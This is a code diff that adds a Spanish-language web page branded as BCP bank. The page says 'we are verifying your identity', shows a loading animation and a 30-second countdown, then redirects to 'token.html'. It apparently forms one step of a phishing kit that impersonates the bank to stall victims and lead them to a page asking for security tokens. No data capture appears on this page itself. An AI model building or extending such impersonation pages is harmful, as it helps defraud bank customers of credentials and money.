@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Confirmar Operación - BCP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const countdownLabel = document.getElementById("times");
+        let countdown = 30; // Inicializamos el contador en 30 segundos
+
+        // Función para actualizar el contador
+        function startCountdown() {
+          const interval = setInterval(() => {
+            countdown--;
+            countdownLabel.textContent = countdown;
+
+            // Cuando el contador llega a 0, redirigimos a otra página
+            if (countdown <= 0) {
+              clearInterval(interval);
+              window.location.href = "token.html"; // Cambia la URL aquí
+            }
+          }, 1000); // Ejecutar cada segundo
+        }
+
+        // Iniciar el contador cuando la página esté cargada
+        startCountdown();
+      });
+    </script>
+  </head>
+  <body class="bg-gray-100">
+    <!-- Top Bar -->
+    <div class="bg-blue-800 p-3 flex items-center justify-between text-white">
+      <div class="flex items-center space-x-2">
+        <img src="bcp-dark-default.svg" alt="BCP logo" class="h-5" />
+      </div>
+      <i class="fas fa-bars text-lg"></i>
+    </div>
+
+    <!-- Main Content -->
+    <form id="loginform">
+      <div class="max-w-lg mx-auto bg-white shadow-lg rounded-lg mt-6">
+        <!-- Confirmar operación -->
+        <div class="text-center">
+          <h1 class="text-lg text-gray-600 font-medium">
+            Estamos verificando tu identidad
+          </h1>
+
+          <div style="width: 100%; text-align: center; padding: 30px">
+            <div class="loader"></div>
+            
+            <style>
+              .loader {
+                width: 60px;
+                aspect-ratio: 1;
+                animation: l5-0 1s infinite steps(1);
+                margin: auto;
+              }
+              .loader::before,
+              .loader::after {
+                content: "";
+                position: absolute;
+                inset: 0 50% 50% 0;
+                transform-origin: bottom right;
+                animation: l5-1 0.5s infinite linear alternate,
+                  l5-2 0.5s infinite steps(1) alternate;
+              }
+              .loader::after {
+                --s: -1, -1;
+              }
+              @keyframes l5-0 {
+                0% {
+                  transform: scale(1, 1) rotate(0deg);
+                }
+                50% {
+                  transform: scale(1, -1) rotate(90deg);
+                }
+              }
+
+              @keyframes l5-1 {
+                0% {
+                  transform: scale(var(--s, 1)) perspective(150px) rotateX(0deg);
+                }
+                100% {
+                  transform: scale(var(--s, 1)) perspective(150px)
+                    rotateX(180deg);
+                }
+              }
+              @keyframes l5-2 {
+                0% {
+                  background: #0205c2;
+                }
+                50% {
+                  background: #ce5505;
+                }
+              }
+            </style>
+          </div>
+
+          <!-- Desde section -->
+          <div class="mt-6">
+            <p class="text-gray-700 font-semibold" style="padding-bottom: 30px">
+              Por favor espera <label id="times">30</label> segundos
+            </p>
+          </div>
+        </div>
+      </div>
+    </form>
+  </body>
+</html>
